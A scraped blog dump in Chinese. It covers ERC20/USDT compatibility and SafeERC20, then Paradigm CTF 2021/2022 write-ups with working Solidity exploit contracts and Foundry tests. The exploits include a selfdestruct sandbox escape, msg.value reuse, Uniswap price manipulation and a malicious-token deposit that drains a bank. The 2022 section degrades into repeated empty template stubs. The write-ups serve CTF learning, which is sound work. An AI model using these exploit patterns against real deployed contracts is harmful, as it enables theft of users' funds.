可以看到调用test_TransferWithReturnValue，交易会被revert，而调用test_TransferWithOutReturnValue，交易则正常运行。 ​ 同理test_TransferFromWithReturnValue操作也是会被revert。这也就说明了，用标准的ERC20接口转换USDT，就会造成资金永久封锁的情况。当然，为了解决这个问题，可以将合约中的ERC20接口中的那两个函数的返回值移除，即： 1234interface IERC20_USDT &#123; function transfer(address, uint256) external; function transferFrom(address, address, uint256) external;&#125; 3.SafeERC203.1 兼容USDT​ 当然还有其他的解决方式，也是最常用一种解决方式，那就是使用SafeERC20库。 1using SafeERC20 for IERC20; ​ SafeERC20做了兼容严格遵守与不严格遵守ERC20协议标准的代币，兼容的原理如下： 12345678910function _callOptionalReturn(IERC20 token, bytes memory data) private &#123; bytes memory returndata = address(token).functionCall(data); if (returndata.length != 0 &amp;&amp; !abi.decode(returndata, (bool))) &#123; revert SafeERC20FailedOperation(address(token)); &#125;&#125;function safeTransfer(IERC20 token, address to, uint256 value) internal &#123; _callOptionalReturn(token, abi.encodeCall(token.transfer, (to, value)));&#125; ​ 简单来说就是，通过Address.sol的低级调用方式，可以检测调用是否成功，且检测是否有返回值。当调用USDT的transfer函数时，如果执行成功，且return data &#x3D; 0x，那么函数便可以执行，即跳过if的检测。 ​ 同理 transferFrom函数也是如此。 4. ERC20系列数字货币4.1 (Tether USD)USDT​ 不遵循标准的ERC20协议，需要操作该代币时，建议使用SafeERC20.sol。 发行公司: 由 Tether Limited 发行，成立于 2014 年的香港公司。 市值: USDT 是市值最大的稳定币之一，截至 2022 年 7 月，市值超过 650 亿美元，占稳定币市场 50% 以上的份额。 挂钩: USDT 与美元 1:1 挂钩，据称有大量抵押品储备支持，包括现金、商业票据和商品。 历史: 最早作为 RealCoin 推出，后来于 2014 年 11 月更名为 Tether。然而，Tether 并不是没有争议的，曾因多次争议而备受关注，包括被指控误导投资者和缺乏对储备的透明度。 4.2 (USD Coin)USDC​ 遵循标准的ERC20协议。源码链接：link。 发行公司: 由 Circle、Coinbase 和其他金融科技公司共同创立的财团 Center 是 USDC 的发行人。 市值: USDC 是按市值计算的第二大稳定币，截至 2022 年 7 月，市值超过 540 亿美元。 挂钩: 每个 USDC 与美元 1:1 挂钩，并由现金和美元等值资产支持。 安全性: USDC 被认为是一种更安全的价值储存手段，因为它有现金和现金等价物支持，而且受到美国监管。 这两种稳定币的比较： 流动性: USDT 的交易量更大，更广泛可用，但USDC 的交易量较低。 透明度: USDC 在透明度和监管方面表现较好，而 USDT 面临一些争议。 用途: USDT 在期货交易中很受欢迎，提供了更高的收益，而 USDC 是去中心化金融 (DeFi) 领域的首选，因为它被认为更安全。 4.3 其他 (Shiba Inu)SHIB：SHIB是一种基于以太坊的山寨币，算是狗狗币的一种替代品，遵循标准的ERC20协议。 Binance USD(BUSD)：遵循标准的ERC20协议。 DAI Stablecoin (DAI)：遵循标准的ERC20协议。 HEX (HEX)：遵循标准的ERC20协议。 5. ERC20 extensions来自 OpenZeppelin，链接。ERC4626单独xue’xi 5.1 ERC1363.sol ​ 这个拓展协议实现的功能是，用户在执行transfer、transferFrom和approve操作的时候，可以传入calldata，完成一些函数调用，或者是参数的传递，实现逻辑类似ERC721的 checkOnERC721Received()。 它的_checkOnTransferReceived()和_checkOnApprovalReceived()函数会分别去调用IERC1363Receiver(to).onTransferReceived，IERC1363Spender(spender).onApprovalReceived，这里会埋下被重入的安全隐患，在实用这个协议的时候需要注意这点。 5.2 ERC20Burnable.sol ​ 该合约提供了销币功能。 burn(uint256 value)：销毁msg.sender的value个代币。 burnFrom(address account, uint256 value) ：msg.sender销毁account的value个代币，前提是account给予msg.sender权限。 5.3 ERC20Capped.sol 我的理解是，给ERC20代币的的totalsupply盖帽子，也就是设置上限，设置某个ERC20代币的发行量不能超过cap。限制的逻辑在这里(from&#x3D;&#x3D;0，则被检测为铸币操作)： 1234567if (from == address(0)) &#123; uint256 maxSupply = cap(); uint256 supply = totalSupply(); if (supply &gt; maxSupply) &#123; revert ERC20ExceededCap(supply, maxSupply); &#125; &#125; 5.4 ERC20FlashMint.sol ​ 该合约提供了一个借贷功能，只能借该合约生成的代币，且最大接待额为：token == address(this) ? type(uint256).max - totalSupply() : 0；还需要支付fee，这个借贷函数不需要主动还款，因为ta采用的是burn操作，直接将你手中借来的token全部销毁。但是这不影响执行某些重入攻击，比如可以借钱去执行套利操作这类的，这是借贷函数的“通病”吧。 5.5 ERC20Pausable.sol ​ 该合约提供了一个紧急停止功能，在_update()函数加上whenNotPaused修饰符，当所有者暂停合约时，该合约生成的代币将不能执行一系列操作，如transfer、mint、transferFrom等。 5.6 ERC20Permit.sol ​ 该合约提供了一个新的授权操作，permit()函数的作用便是完成 owner对spender的授权，个人理解是，因为原ERC20中的approve函数必须是owner亲自去调用才能完成授权，这比较麻烦owner，而permit则是可以通过owner提供的签名来验证，并执行owner对spender的授权操作。 举个例子来对比，以开门为例： 原ERC20的授权方式：owner想让spender进屋拿东西，而owner需要亲自开门让他进去 ERC20Permit的授权方式：同样的示例，owner可以直接把家门口的钥匙给spender，让spender直接去开门拿东西就好了。 5.7 ERC20Votes.sol ​ 该合约支持类似Compound的投票和授权。 5.8 ERC20Wrapper.sol ​ 该合约支持代币的包装，用户可以存入和取出_underlying代币，存入多少_underlying代币，就可以铸造多少ERC20Wrapper代币，同理取出多少 _underlying代币，便会销毁多少ERC20Wrapper代币代币。 还提供了一个 _recover函数，该函数的作用是将错误转入该合约的 _underlying代币数量全部铸造为ERC20Wrapper代币，我对“错误转入”的理解是，没有通过depositFor()函数转入 _underlying代币。","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC20","slug":"ERC20","permalink":"https://biyouqiuqiu.com/tags/ERC20/"}]},{"title":"新篇章","slug":"Experience/重新开始","date":"2024-01-01T02:00:00.000Z","updated":"2024-01-01T02:00:00.000Z","comments":true,"path":"2024/01/01/Experience/重新开始/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/01/Experience/%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B/","excerpt":"","text":"2024年是不平凡的一年，勇敢为自己的想法付之行动！ 2023年的那些失败与遗憾，尽抛之脑后。 悟已往之不谏，知来者之可追！","categories":[],"tags":[{"name":"Experience","slug":"Experience","permalink":"https://biyouqiuqiu.com/tags/Experience/"}]},{"title":"Paradigm_CTF_2022","slug":"CTFS/Paradigm CTF 2022/Paradigm_CTF_2022","date":"2023-11-19T03:50:10.000Z","updated":"2023-11-19T03:50:10.000Z","comments":true,"path":"2023/11/19/CTFS/Paradigm CTF 2022/Paradigm_CTF_2022/","link":"","permalink":"https://biyouqiuqiu.com/2023/11/19/CTFS/Paradigm%20CTF%202022/Paradigm_CTF_2022/","excerpt":"","text":"前言 旨在复现，比赛环境没了，只能自己搭建环境，尽可能还原比赛场景。 0x00-random1.request 将Random合约中的solved修改为true。 2. analysis 签到题，没啥说的。 3. solve攻击合约： 123456789101112131415161718192021// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.15;import &quot;../../../src/Paradigm_CTF_2022/random/Setup.sol&quot;;contract RandomExploit &#123; Setup setup; Random random; constructor(address _setup) &#123; setup = Setup(_setup); random = setup.random(); &#125; function pwn() public &#123; random.solve(4); require(setup.isSolved(), &quot;!solved&quot;); &#125;&#125; 测试： 12345678910111213141516171819202122// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.15;import &quot;./RandomExploit.sol&quot;;import &quot;forge-std/Test.sol&quot;;contract TestRandomExploit is Test &#123; Setup setup; RandomExploit exploit; function setUp() public &#123; setup = new Setup(); exploit = new RandomExploit(address(setup)); &#125; function test_isSovled() public &#123; exploit.pwn(); assertEq(setup.isSolved(), true); &#125;&#125; 结果： 0x01-rescue1.request https://blog.cyberight.capital/paradigm-ctf-2022-solution-writeup-46e8188e3726 2. analysis 3. solve攻击合约： 12345```*测试：*```solidity 结果： 0x01.request 2. analysis 3. solve攻击合约： 12345```*测试：*```solidity 结果： 0x01.request 2. analysis 3. solve攻击合约： 12345```*测试：*```solidity 结果： 0x01.request 2. analysis 3. solve攻击合约： 12345```*测试：*```solidity 结果： 0x01.request 2. analysis 3. solve攻击合约： 12345```*测试：*```solidity 结果： 0x01.request 2. analysis 3. solve攻击合约： 12345```*测试：*```solidity 结果：","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"Paradigm-CTF-2022","slug":"CTFS/Paradigm-CTF-2022","permalink":"https://biyouqiuqiu.com/categories/CTFS/Paradigm-CTF-2022/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Paradigm_CTF_2021","slug":"CTFS/Paradigm CTF 2021/Paradigm_CTF_2021","date":"2023-10-14T03:50:10.000Z","updated":"2023-10-14T03:50:10.000Z","comments":true,"path":"2023/10/14/CTFS/Paradigm CTF 2021/Paradigm_CTF_2021/","link":"","permalink":"https://biyouqiuqiu.com/2023/10/14/CTFS/Paradigm%20CTF%202021/Paradigm_CTF_2021/","excerpt":"","text":"前言 旨在使用新学的foundry来复现，提升自身水平，以及加强对工具的使用，比赛环境没了，只能自己模拟。 代码仓库：链接 0x00-hello1. request 使Setup合约中的isSolved函数返回true。 2. analysis 签到题，很简单，不必多说。 3. solve攻击合约 12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Test.sol&quot;;import &quot;../../../src/Paradigm_CTF_2021/hello/Setup.sol&quot;;contract HelloHacker is Test &#123; Setup setup; Hello hello; function setUp() public &#123; setup = new Setup(); hello = setup.hello(); &#125; function test_isSolved() public &#123; hello.solve(); // set solved = true assertEq(setup.isSolved(), true); &#125;&#125; 0x01-secure1. request 使得address(setup)合约的WETH代币&#x3D;&#x3D;50ether。 2. analysis 分析setup合约构造函数的逻辑， 12345wallet.allowModule(tokenModule); // _allowed[tokenModule] = trueWETH.deposit.value(msg.value)(); // address(this)往WETH存了50 etherWETH.approve(address(wallet), uint(-1)); // 授权 wallet type(uint256).max// TokenModule(0x00).deposit.selector 等效于 TokenModule.deposit.selectorwallet.execModule(tokenModule, abi.encodeWithSelector(TokenModule(0x00).deposit.selector, WETH, address(this), msg.value)); 因为没有了比赛环境，复现起来有点困难。emmm，大概的意思是：Setup往WETH9中存入了50 ether，并且Setup给Wallet授权使其能够操作Setup的所有WETH代币，然后最后一句就是Wallet将Setup的50 ether WETH代币，全部存入了TokenModule中，此时的WETH.balanceOf(address(this)) == 0. WETH.approve(address(wallet), uint(-1))这一步很神奇，直接使得WETH9中的transferFrom函数可以顺利执行（在delegatecall和call的传递链如下）。 TokenModule的withdraw函数没有限制，可以直接取出来，但是无法获取setup中的TokenModule，行不通。网上看一些题解，说挑战者拥有5000ether😓😓😓，那还想那么多干嘛，直接自己存50ether WETH，再转给Setup就ok了。。。解题方式有点出乎意料，复现过程只能自己实现WETH9合约了。 WETH9合约链接 3. solve攻击合约 1234567891011121314151617181920212223242526272829303132333435363738394041424344// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Test.sol&quot;;import &quot;./Interface.sol&quot;;contract SecureHacker is Test &#123; string constant path_WETH9 = &quot;out/WETH9.sol/WETH9.json&quot;; string constant path_SetUp = &quot;out/secure/Setup.sol/Setup.json&quot;; uint public constant WANT = 50 ether; WETH9 WETH; Setup setup; function setUp() public payable &#123; WETH = WETH9(deploy_WETH9()); setup = Setup(this.deploy_Setup&#123;value:WANT&#125;(address(WETH))); &#125; function test_isSolve() public &#123; console2.log(address(WETH), address(setup)); WETH.deposit&#123;value:WANT&#125;(); // 使得hacker&#x27;s WETH == 50 ether WETH.transfer(address(setup), WANT); // 将 50 ether WETH 转移给 setup assertEq(setup.isSolved(), true); &#125; function deploy_WETH9() internal returns (address weth9) &#123; bytes memory WETH9_bytycode = vm.getCode(path_WETH9); assembly &#123; weth9 := create(0, add(WETH9_bytycode, 0x20), mload(WETH9_bytycode)) &#125; &#125; function deploy_Setup(address _weth9) external payable returns (address _setup) &#123; require(msg.value == WANT, &quot;Please pay 50 ether...&quot;); bytes memory setup_bytycode = abi.encodePacked(vm.getCode(path_SetUp), abi.encode(_weth9)); assembly &#123; _setup := create(WANT, add(setup_bytycode, 0x20), mload(setup_bytycode)) &#125; &#125;&#125; 0x02-babycrypto1. request 这是一道python题，先跳过。 2. analysis 首先需要将python的版本降低，否则无法下载sha3库，我这里下载的python3.6，且pip的版本为 10.0.1。 3. solve 以后技术上来了，再回来看看 0x03-broker1. request 将Broker合约中的WETH代币取出20-25 ether，使得Broker合约的WETH余额小于5 ether。 2. analysis 这道题，emmmm，我不理解的是，我可以拥有WETH 5000 ether，AWT 无限量，但是Token的地址是随机生成的，ta的数值可以比WETH的地址的数值大，亦可以比ta小，所以不同排序方式做题也会不一样，难搞。。。 这道题假定AWT为reverse0，WETH为reverse1。 初步分析： 我手中拥有 5000 ETH，即可以换成 5000 WETH，看到Token合约中的airdrop函数，这个函数有一个明显的漏洞（可以从该函数中获取无数的token，实现方式是：拥有很多账户）。 此时可以将各个合约的token和WETH的数目列出： contract Token balance WETH balance Setup 0 0 Broker 500_000 ether 25 ether Pair 500_000 ether 25 ether Hacker too much 5000 ether rate的值是可以由我控制的，因为我手中有着众多的WETH 和 Token，我可以控制汇率！！！ 该题的题眼在于liquidata(address,uint256)函数中，只要使得collateralValueRepaid的值处于(20 ether,25 ether)范围即可。这便需要将 rate()的值压小，即将其中的reverse0升值，reverse1贬值（在V2中要维持K值恒定，balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(1000**2)，rate &#x3D; reverse0 &#x2F; reverse1，将reverse0的数量减少即升值，将reverse1的数量增多即贬值）。 现在的问题是怎么凑这个collateralValueRepaid，初始的pair的滑点k=500000*25=1.25*10^7，将collateralValueRepaid用表达式表示为：collateralValueRepaid=amount*reverse1/reverse0，我的处理方式为：存入4975 WETH，换出450 000 AWT，此时的滑点为k=5000*50000=2.5*10^8满足swap的条件，liquidate::amount，amount&#x3D;23 ether * broker.rate()，因为debt[broker]=250_000 ether，所以满足safeDebt(user) &lt;= debt[user] &amp;&amp; debt[user] - amount &gt;= 0。 综上，攻击思路为： 获取30 ether AWT 兑换 4975 ether WETH，并存入pair中 通过swap函数，兑换出450000 ether AWT 给broker授权，再通过liquidate取出 23 ether WETH 没有比赛环境，要复现还是有点困难的，就不去部署V2相关合约了 3. solve攻击合约 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../../../src/Paradigm_CTF_2021/broker/Setup.sol&quot;;contract BrokerHacker_ &#123; Setup setup; IUniswapV2Pair pair; WETH9 weth; Token token; Broker broker; // init parameter constructor(address _setup) &#123; setup = Setup(_setup); pair = setup.pair(); weth = setup.weth(); token = setup.token(); broker = setup.broker(); &#125; // get AWT from airdrop function getAWT() internal &#123; for (uint i; i &lt; 3; i++) &#123; new BrokerHelper(address(token)); &#125; &#125; function pwn() public payable &#123; require(msg.value == 4975 ether, &quot;You must pay 4975 ether&quot;); // 1. get 30 token getAWT(); // hacker&#x27;s token = 30 ether // 2. get 4975 ether WETH weth.deposit&#123;value:msg.value&#125;(); // 3. transfer pair 4975 ether WETH weth.transfer(address(pair), weth.balanceOf(address(this))); // 4. modify the rate = 1:1 pair.swap(450_000 ether, 0, address(this), &quot;&quot;); // 5. call liquidate() token.approve(address(broker), type(uint256).max); uint amount = 23 ether * broker.rate(); broker.liquidate(address(setup), amount); // 6. verify require(setup.isSolved(), &quot;You don&#x27;t solve....&quot;); &#125;&#125;contract BrokerHelper &#123; constructor(address _token) &#123; Token token = Token(_token); token.airdrop(); token.transfer(msg.sender, 10 ether); &#125;&#125; 0x04-babysandbox1. request 使得sandbox合约的代码为0，即毁掉sandbox合约。 2. analysis BabySandbox中只有一个run函数，分析run函数： 函数体中有三个调用，分别是delegatecall, staticcall, call，将这三个调用翻译为熟悉的solidity语言为 123456address(code).delegatecall(&quot;&quot;);address(this).staticcall(msg.data);address(this).call(msg.data);// 这里的msg.data 已经被如下操作拷贝到memory [0x00 - calldatasize-1]的位置去了calldatacopy(0x00, 0x00, calldatasize()) // 将msg.data从0x00的位置拷贝到memory0x00的位置 显然，要使得该合约自毁，只能通过delegatecall，而且这是一个空调用，所以自毁逻辑需要在code的fallback中。并且delegatecall的调用者必须是本合约自己，所以只能通过后面的staticall和call来调用，但是涉及了修改合约的状态，所以只能通过call。因此，需要保证staticcall调用成功（且不修改合约变量），call调用成功（修改合约变量），ta们都会再次调用自身的run函数，执行delegatecall，这就需要确保，调用code的两次fallback达成两种不同的效果了（第一次调用不改变变量，即deletecall成功执行，return，跳出staticcall合约调用栈；第二次执行自毁逻辑，即deletecall成功执行，return，跳出call合约调用栈，有点类似ethernaut的elevator）。 这里提供了两种解题方法，一种是通过冷热地址消耗的gas实现，一种是通过try...catch语句块来实现。 （注意第二种方法，因为每一个调用都有gasLimit–0x4000，所以需要逻辑不能太复杂，而且还需要事先将this记录下来，这是我第一次遇到，可能是减少gas的消耗吧。） 3. solve验证攻击合约 123456789101112131415161718192021222324252627282930pragma solidity 0.7.0;pragma experimental ABIEncoderV2;import &quot;forge-std/Test.sol&quot;;import &quot;../../../src/Paradigm_CTF_2021/babysandbox/Setup.sol&quot;;import &quot;./BabySandboxHacker_1.sol&quot;;import &quot;./BabySandboxHacker_2.sol&quot;;contract BabySandboxHacker is Test &#123; Setup setup; BabySandbox sandbox; // BabySandboxHacker_1 hacker; BabySandboxHacker_2 hacker; function setUp() public &#123; setup = new Setup(); sandbox = setup.sandbox(); // hacker = new BabySandboxHacker_1(); hacker = new BabySandboxHacker_2(); sandbox.run(address(hacker)); &#125; function test_isSloved() external &#123; assertEq(setup.isSolved(), true); &#125; &#125; 攻击合约 123456789101112131415161718192021222324252627282930313233343536373839404142// hacker1pragma solidity 0.7.0;contract BabySandboxHacker_1 &#123; function juge() internal view returns (uint gasused) &#123; uint before_ = gasleft(); uint balance = address(0).balance; gasused = before_ - gasleft(); &#125; fallback() external payable &#123; uint gasused = juge(); if (gasused &gt; 2600) &#123; return; &#125; else &#123; selfdestruct(payable(msg.sender)); &#125; &#125;&#125;// hacker2pragma solidity 0.7.0;contract BabySandboxHacker_2 &#123; // save gas BabySandboxHacker_2 private immutable self = this; event _chageState(); function chageState() external &#123; emit _chageState(); &#125; fallback() external payable &#123; try self.chageState() &#123; selfdestruct(payable(tx.origin)); &#125; catch &#123; return; &#125; &#125;&#125; 0x05-bouncer1. request 将bouncer的balance掏空。 2. analysis 这道题的漏洞在于 for循环中复用msg.value。 一开始setup往bouner中存放了52ether。 分析bouncer合约： 合约中涉及到转账（ETH）的只有两个函数claimFees() payout()， 因为不是owner，所以无法直接执行clainFees函数，也不能通过hatch函数进行插槽覆盖，只能通过payout函数。payount &#x3D;&gt; redeem &#x3D;&gt; covert。想要通过payout取钱，只能调用redeem函数，而tokens mapping只有在convert函数中可以赋值，取钱的前提是token必须是address(ETH)，而且ETH和以太的汇率为1：1，所以要是通过convert函数换，只能支付多少换多少WETH。再看到convertMany函数，循环调用convert，这里很明显，只支付一次Entry.amount的费用，便可以兑换ids.length次。 综上，攻击思路为 hacker往bouncer存入8给Entry{amount：10ether，token&#x3D;ETH}（此时bouncer’s balance&#x3D;60ether） 构建长度为7的ids hacker调用convertMany并支付10ether（和Entry.amount相等，此时bouncer’s balance&#x3D;70ether），convertMany函数体中进行7次兑换，此时tokens[hacker]][ETH]==70 ether。 通过redeem函数一次性将bouncer的余额（70ether）全部掏空。 3. solve攻击合约（enter和convertMany不能在同一个函数中执行，需要拆分，foundry中使用cheatcode改变block.number）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../../../src/Paradigm_CTF_2021/bouncer/Setup.sol&quot;;contract BouncerHacker_ &#123; address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE; uint256 public constant entryFee = 1 ether; Setup setup; Bouncer bouncer; constructor(address _setup) &#123; setup = Setup(_setup); bouncer = setup.bouncer(); &#125; function pwn1() external payable &#123; require(msg.value == 8 ether, &quot;You must pay 8 ether&quot;); // 1. entry 8 Entry for (uint256 i = 0; i &lt; 8; i++) &#123; bouncer.enter&#123;value:entryFee&#125;(ETH, 10 ether); &#125; &#125; function pwn2() external payable &#123; require(msg.value == 10 ether, &quot;You must pay 10 ether&quot;); // 2. structure arrays() uint256[] memory ids = new uint256[](7); for (uint256 i = 0; i &lt; ids.length; i++) &#123; ids[i] = i; &#125; // 3. call convertMany() pay 10 ether to tokens[address(this)][ETH] == 70 ether bouncer.convertMany&#123;value:10 ether&#125;(address(this), ids); // 4. token out money bouncer.redeem(ERC20Like(ETH), bouncer.tokens(address(this), ETH)); // 5. is solved require(setup.isSolved(), &quot;You don&#x27;t sovle...&quot;); &#125; // To receive the ETHs receive() external payable &#123;&#125;&#125; 攻击合约测试 123456789101112131415161718192021222324252627282930313233343536373839// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Test.sol&quot;;import &quot;../../../src/Paradigm_CTF_2021/bouncer/Setup.sol&quot;;import &quot;./BouncerHacker_.sol&quot;;contract BouncerHacker is Test &#123; string constant path_WETH9 = &quot;out/WETH9.sol/WETH9.json&quot;; Setup setup; BouncerHacker_ hacker; address weth; function setUp() public &#123; weth = deploy_WETH9(); setup = new Setup&#123;value: 100 ether&#125;(weth); hacker = new BouncerHacker_(address(setup)); &#125; function test_isSolved() public &#123; hacker.pwn1&#123;value: 8 ether&#125;(); // Here need set block.number increase // require(block.timestamp != entry.timestamp, &quot;err/wait after entering&quot;); vm.warp(block.number + 1); hacker.pwn2&#123;value: 10 ether&#125;(); assertEq(setup.isSolved(), true); &#125; function deploy_WETH9() internal returns (address _weth) &#123; bytes memory bytecode = vm.getCode(path_WETH9); assembly &#123; _weth := create(0, add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125; 0x06-farmer1. request faucet的COMP余额为0，farmer的COMP余额为0，farmer的DAI余额小于expectedBalance。 2. analysis 从isSolve()函数中可以追溯到CompFaucet，CompDaiFarmer合约， 可以看到，ComFaucet::claimComp()函数可以被人任何人调用，所以可以直接调用该函数使得faucet的COMP余额为0（将所有的COMP转移给了Farmer）。CompDaiFarmer::recycle()函数则是将合约中所有COMP兑换成dai，兑换之后，farmer的COMP余额为0。所以题目的前两个要求可以满足，此时需要想办法使得DAI.balanceOf(address(farmer)) &lt; expectedBalance，看到expectedBalance的计算方式： 12345678910111213expectedBalance = DAI.balanceOf(address(farmer)) + farmer.peekYield();// peekYield() function peekYield() public view returns (uint256) &#123; uint256 claimableAmount = IComptroller(comptroller).claimableComp(); address[] memory path = new address[](3); path[0] = address(COMP); path[1] = address(WETH); path[2] = address(dai); uint256[] memory amounts = router.getAmountsOut(claimableAmount, path); return amounts[2]; &#125; 可以知道：farmer.peekYield()=COMP=&gt;WETH=&gt;dai。 分析各合约的代币： contract COMP WETH dai setup faucet WETH(50)&#x3D;&gt;COMP farmer equal comp.balance(faucet) COMP&#x3D;&gt;WETH&#x3D;&gt;dai hacker WETH&#x3D;&gt;COMP 5000 WETH&#x3D;&gt;dai 题目中的expectedBalance的值实际上是根据当时的pool价格、汇率求出来的；而在v2 pool中代币的价格和代币间的汇率是可以被操控的，前提是维持滑点 K 不变即可。 分析汇率变化对expectedBalance值的影响： dai贬值：DAI.balanceOf(address(farmer)) &gt; expectedBalance dai升值：DAI.balanceOf(address(farmer)) &lt; expectedBalance，这正是题目的要求，所以问题转化为如何使dai升值。 代币 (COMP,WETH) (WETH,dai) COMP COMP数量增多，COMP贬值，WETH升值 WETH WETH数量增多，WETH贬值，COMP升值 WETH数量增多，WETH贬值，dai升值 dai dai数量增多，dai贬值，WETH升值 我手中有5000 ether WETH ，我能够影响到 comp,weth，weth,dai这里两个交易池。在COMP=&gt;WETH=&gt;dai的兑换路径中，可以事先用手中的WETH在weth,dai交易池中换出dai，此时dai升值，COMP=&gt;WETH=&gt;dai换出的dai便会小于预期。 这是典型的 DeFi Sandwich Attacks（三明治攻击）。 3. solve攻击合约 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../../../src/Paradigm_CTF_2021/farmer/Setup.sol&quot;;contract FarmerHacker_ &#123; Setup setup; WETH9 WETH; CompDaiFarmer farmer; CompFaucet faucet; UniRouter ROUTER; ERC20Like DAI; constructor(address _setup) &#123; setup = Setup(_setup); WETH = setup.WETH(); farmer = setup.farmer(); faucet = setup.faucet(); ROUTER = setup.ROUTER(); DAI = setup.DAI(); &#125; function pwn() public payable &#123; // 1. should pay only a little ETH to deposit WETH require(msg.value == 1 ether); // 2. depoist WETH WETH.deposit&#123;value:msg.value&#125;(); WETH.approve(address(ROUTER), msg.value); // 3. raise the price of dai // 3.1 set path address[] memory path = new address[](2); path[0] = address(WETH); path[1] = address(DAI); // 3.2 WETH =&gt; dai, uint bal = WETH.balanceOf(address(this)); ROUTER.swapExactTokensForTokens( bal, 0, path, address(this), block.timestamp ); // 4. call claim() to make COMP.balanceOf(faucet)==0 farmer.claim(); // 5. call recycle() to make COMP.balanceOf(farmer) == 0, // DAI.balanceOf(address(farmer)) &lt; expectedBalance farmer.recycle(); // 6. is solved require(setup.isSolved(), &quot;!sloved&quot;); &#125;&#125; 0x07-yield_aggregator1. request 将aggregator和bank的WETH代币掏空。 初始状态为：weth.balanceOf(address(aggregator)) == 0 ether， ​ weth.balanceOf(address(bank)) == 50 ether 2. analysis 分析 MiniBank合约 该合约很简单，一个铸币一个销币函数，铸币的条件是需要支付等额的WETH代币才可以使得银行balance增加等同的数额，销币则是需要银行余额大于或等于销币数额才可以成功，并向调用者转入等额的WETH代币。 分析 YieldAggregator 合约 该合约两个函数，deposit和withdraw。 deposit函数类似一个交换平台，负责将token代币转换为银行余额（该转换平台，只能转换WETH代币，其他代币无法转，因为该合约的WETH代币数量初始化为0，转换其他代币函数也不会报错）。 withdraw函数负责，从bank中取出WETH，再归还等额的token给msg.sender。不过前提是，msg.sender的poolTokens有足够多的数额。 综上，能取出WETH代币的，只有burn() 和 withdraw()函数。看到poolTokens的赋值方式： 12345uint256 balanceBefore = protocol.balanceUnderlying(); // .....uint256 balanceAfter = protocol.balanceUnderlying();uint256 diff = balanceAfter - balanceBefore;poolTokens[msg.sender] += diff; diff的值由bank的WETH代币数量变动确定，而函数体中的token可以自定义，所以关于token的函数调用中存在了很多执行恶意操作空间，即transferFrom和approve函数中可以自定义函数逻辑。只需要在transferFrom函数中，执行bank.mint() 这样一来既可以使bank的余额增加，也可以使poolTokens[hacker]的值增加，即存一份WETH可以取出两倍的WETH。（事先买好WETH【挑战者拥有5000 ether】，再对bank进行授权操作） 3. solve攻击合约 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../../../src/Paradigm_CTF_2021/yield_aggregator/Setup.sol&quot;;contract YieldAggregatorHacker_ &#123; Setup setup; YieldAggregator aggregator; MiniBank bank; ERC20Like weth; constructor(address _setup) &#123; setup = Setup(_setup); aggregator = setup.aggregator(); bank = setup.bank(); weth = bank.underlying(); &#125; function pwn() external payable &#123; require(msg.value == 50 ether, &quot;You must pay 50 ether&quot;); // 1. buy 50 ether WETH WETH9(address(weth)).deposit&#123;value: msg.value&#125;(); // 2. approve the bank WETH9(address(weth)).approve(address(bank), 50 ether); // 3. make `poolTokens[hacker] = 50 ether` address[] memory _tokens = new address[](1); _tokens[0] = address(this); uint256[] memory _amounts = new uint256[](1); _amounts[0] = 50 ether; aggregator.deposit(Protocol(address(bank)), _tokens, _amounts); // 4. take out the WETH through withdraw() _tokens[0] = address(weth); // modify the token aggregator.withdraw(Protocol(address(bank)), _tokens, _amounts); // 5. take out the WETH through burn() bank.burn(50 ether); // 6. juge isSolved require(setup.isSolved(), &quot;You don&#x27;t solve...&quot;); &#125; // nothing to do function approve(address, uint256) external returns (bool)&#123; &#125; function transferFrom( address, address, uint256 ) external returns (bool)&#123; /** 1. make `balanceAfter - balanceBefore = 50 ether` 2. make `balanceOf[hacker] = 50 ether` */ bank.mint(50 ether); return true; &#125;&#125; 攻击合约测试 123456789101112131415161718192021222324252627282930313233343536// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Test.sol&quot;;import &quot;./YieldAggregatorHacker_.sol&quot;;contract YieldAggregatorHacker is Test &#123; string constant path_WETH9 = &quot;out/WETH9.sol/WETH9.json&quot;; address weth; Setup setup; YieldAggregator aggregator; MiniBank bank; YieldAggregatorHacker_ hacker; function setUp() public &#123; weth = deploy_WETH9(); setup = new Setup&#123;value: 100 ether&#125;(weth); aggregator = setup.aggregator(); bank = setup.bank(); hacker = new YieldAggregatorHacker_(address(setup)); &#125; function test_isSolved() public &#123; hacker.pwn&#123;value: 50 ether&#125;(); assertEq(setup.isSolved(), true); &#125; function deploy_WETH9() internal returns (address _weth) &#123; bytes memory bytecode = vm.getCode(path_WETH9); assembly &#123; _weth := create(0, add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125; 0x08-market1. request 将Market合约的balance掏空，初始Market的balance&#x3D;50ether。 2. analysis 